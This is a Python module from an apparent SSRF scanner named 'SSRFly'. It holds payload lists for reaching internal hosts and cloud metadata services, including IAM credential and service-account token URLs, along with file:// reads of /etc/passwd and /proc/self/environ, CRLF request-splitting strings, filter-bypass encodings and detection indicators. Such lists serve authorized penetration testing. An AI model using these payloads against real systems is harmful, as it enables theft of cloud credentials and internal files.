"""
SSRF payloads and detection methods for SSRFly
"""

class SSRFPayloads:
    """Class containing SSRF payloads and detection logic."""
    
    @staticmethod
    def get_callback_domain():
        """
        Get the callback domain for SSRF testing.
        This would ideally be a domain you control for callbacks.
        """
        return "ssrfly.oob.test"
    
    @staticmethod
    def get_internal_ip_payloads():
        """
        Get payloads for testing internal IP access.
        
        Returns:
            list: List of internal IP payloads
        """
        return [
            # Localhost variants
            "127.0.0.1",
            "localhost",
            "0.0.0.0",
            "127.1",
            "127.0.1",
            
            # Loopback IP address in different formats
            "2130706433",  # Decimal representation of 127.0.0.1
            "0x7f000001",  # Hex representation of 127.0.0.1
            "017700000001",  # Octal representation of 127.0.0.1
            
            # IPv6 variants for localhost
            "::1",
            "0:0:0:0:0:0:0:1",
            
            # Common private IPs
            "10.0.0.1",
            "172.16.0.1",
            "192.168.1.1",
            "169.254.169.254",  # AWS metadata endpoint
            
            # Encoded variants
            "http://127.0.0.1/",
            "http://localhost/",
            
            # URL encoded variants
            "http://%31%32%37%2E%30%2E%30%2E%31/",
            "http://127.0.0.1%09/",
            "http://127.0.0.1%0D/",
            "http://127.0.0.1%0A/",
            
            # Double-URL encoded variants
            "http://%2531%2532%2537%252E%2530%252E%2530%252E%2531/",
            
            # Protocol wrappers
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:22",
            "http://127.0.0.1:25",
            
            # DNS rebinding
            f"http://n-{SSRFPayloads.get_callback_domain()}/"
        ]
    
    @staticmethod
    def get_cloud_metadata_payloads():
        """
        Get payloads for testing cloud metadata services.
        
        Returns:
            list: List of cloud metadata payloads
        """
        return [
            # AWS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            
            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            
            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-01-01&format=json",
            
            # DigitalOcean
            "http://169.254.169.254/metadata/v1.json",
            
            # Alibaba Cloud
            "http://100.100.100.200/latest/meta-data/",
            
            # OpenStack
            "http://169.254.169.254/openstack/latest/meta_data.json"
        ]
    
    @staticmethod
    def get_scheme_wrappers():
        """
        Get different URL scheme wrappers for SSRF testing.
        
        Returns:
            list: List of URL scheme wrappers
        """
        base_url = "127.0.0.1"
        return [
            f"http://{base_url}",
            f"https://{base_url}",
            f"file://{base_url}",
            f"dict://{base_url}",
            f"ftp://{base_url}",
            f"gopher://{base_url}",
            f"jar://{base_url}",
            f"ldap://{base_url}",
            f"mailto:{base_url}",
            f"sftp://{base_url}",
            f"tftp://{base_url}",
            f"whois://{base_url}",
            f"data:text/plain;base64,SSBhbSBhIGZpbGU="
        ]
    
    @staticmethod
    def get_path_traversal_payloads():
        """
        Get payloads for path traversal combined with SSRF.
        
        Returns:
            list: List of path traversal payloads
        """
        return [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/self/exe",
            "file:///var/log/auth.log",
            "file:///var/log/syslog",
            "file:///var/log/httpd/access_log",
            "file:///var/log/apache2/access.log",
            "file:///var/www/html/index.php",
            "file://C:/Windows/System32/drivers/etc/hosts",
            "file://C:/Windows/win.ini",
            "file:///Windows/win.ini",
            "file://C:/boot.ini",
            "file://C:/inetpub/wwwroot/web.config"
        ]
    
    @staticmethod
    def get_request_splitting_payloads():
        """
        Get payloads for HTTP Request Splitting attacks.
        
        Returns:
            list: List of request splitting payloads
        """
        return [
            "http://127.0.0.1:80%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a",
            "http://127.0.0.1:80?%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a",
            "http://127.0.0.1:80#%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a"
        ]
    
    @staticmethod
    def get_filter_bypass_payloads():
        """
        Get payloads designed to bypass common SSRF filters.
        
        Returns:
            list: List of filter bypass payloads
        """
        base_domains = [
            "127.0.0.1",
            "localhost",
            "169.254.169.254"
        ]
        
        payloads = []
        for domain in base_domains:
            # IP obfuscation techniques
            payloads.extend([
                f"http://{domain.replace('.','-')}.nip.io",
                f"http://0//{domain}/",
                f"http://0///{domain}/",
                f"http://{domain}:80",
                f"http://{domain}:443",
                f"http://{domain}:22",
                
                # Decimal IP conversion
                f"http://{SSRFPayloads._convert_ipv4_to_decimal(domain) if '.' in domain else domain}",
                
                # URL encoded characters
                f"http://{domain.replace('.', '%2e')}",
                
                # Double URL encoded
                f"http://{domain.replace('.', '%252e')}",
                
                # Triple URL encoded
                f"http://{domain.replace('.', '%25252e')}",
                
                # Mixed encoding
                f"http://{domain[:3]}.%2e{domain[4:] if '.' in domain else ''}",
                
                # Domain fronting-like technique
                f"http://allowed-domain.com@{domain}",
                f"http://allowed-domain.com%20@{domain}",
                f"http://{domain}#.allowed-domain.com",
                
                # Unicode normalization
                f"http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
                
                # Using shorteners or redirectors (conceptual, would need actual URLs)
                f"http://tinyurl.com/ssrf-to-{domain}",
                
                # DNS tricks
                f"http://{domain.replace('.', 'a.')}.nip.io"
            ])
            
            # Add HTTPS variants
            for payload in list(payloads):
                if payload.startswith("http://"):
                    payloads.append(payload.replace("http://", "https://"))
        
        return payloads
    
    @staticmethod
    def _convert_ipv4_to_decimal(ip_addr):
        """
        Convert IPv4 address to decimal notation.
        
        Args:
            ip_addr (str): IPv4 address in dotted notation
            
        Returns:
            str: Decimal representation of IP address
        """
        try:
            parts = list(map(int, ip_addr.split('.')))
            if len(parts) == 4:
                return str((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3])
            return ip_addr
        except:
            return ip_addr
    
    @staticmethod
    def get_all_payloads():
        """
        Get all SSRF payloads combined.
        
        Returns:
            list: Combined list of all SSRF payloads
        """
        payloads = []
        payloads.extend(SSRFPayloads.get_internal_ip_payloads())
        payloads.extend(SSRFPayloads.get_cloud_metadata_payloads())
        payloads.extend(SSRFPayloads.get_scheme_wrappers())
        payloads.extend(SSRFPayloads.get_path_traversal_payloads())
        payloads.extend(SSRFPayloads.get_request_splitting_payloads())
        payloads.extend(SSRFPayloads.get_filter_bypass_payloads())
        
        # Remove duplicates while preserving order
        unique_payloads = []
        for payload in payloads:
            if payload not in unique_payloads:
                unique_payloads.append(payload)
                
        return unique_payloads
    
    @staticmethod
    def get_ssrf_indicators():
        """
        Get indicators that might appear in responses to identify SSRF vulnerabilities.
        
        Returns:
            list: List of SSRF indicators
        """
        return [
            # File leaks
            "root:x:", 
            "mysql:x:",
            "<!DOCTYPE html>",
            "<html>",
            "HTTP/1.1",
            
            # Cloud metadata indicators
            "ami-id",
            "instance-id",
            "instance-type",
            "accountId",
            "compute",
            "serviceAccounts",
            "computeMetadata",
            "metadata",
            "iam",
            "security-credentials",
            "token",
            
            # Error messages that might indicate SSRF
            "Failed to connect to",
            "Connection refused",
            "Unknown host",
            "Network is unreachable",
            "No route to host",
            "Operation timed out",
            "Connection timed out",
            "SSL certificate problem",
            "ERROR: The requested URL could not be retrieved",
            "Request forbidden by administrative rules"
        ]
